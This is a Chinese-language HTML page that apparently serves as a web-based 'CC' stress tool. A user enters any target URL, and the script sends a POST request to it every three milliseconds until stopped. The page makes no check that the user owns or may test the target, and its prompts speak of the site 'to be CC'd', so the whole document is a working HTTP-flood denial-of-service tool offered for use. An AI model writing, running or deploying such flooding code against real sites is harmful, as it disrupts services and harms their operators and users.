<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>随身助手cc测压</title>
        <style>
            body {
                display: flex;
                align-items: center;
                justify-content: center;
            }
            input {
                height: 35px;
                padding: 0 10px;
                box-sizing: border-box;
                outline: none;
            }
        </style>
    </head>
    <body>
              <p> <a href="http://www.wuxixindong.top/">随身助手cc</a></p>
    
        <input type="text" placeholder="请输入需要被CC的网址" style="margin-right: 10px" />
        <input type="button" value="开始" />
        
        

        <script>
            let timer = null;
            const input = document.querySelector('input[type="text"]');
            const button = document.querySelector('input[type="button"]');
            button.addEventListener('click', function () {
                const url = input.value;
                if (!url) return alert('请输入需要被压的域名');
                if (!url.startsWith('http')) return alert('请输入http或https开头的网址');
            
              
            
            
                if (this.value === '开始') {
                    this.value = '停止';
                    timer = setInterval(() => {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', url, true);
                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        xhr.send('name=name');
                    }, 3);
                } else {
                    this.value = '开始';
                    clearInterval(timer);
                }
            });
        </script>
    </body>
</html>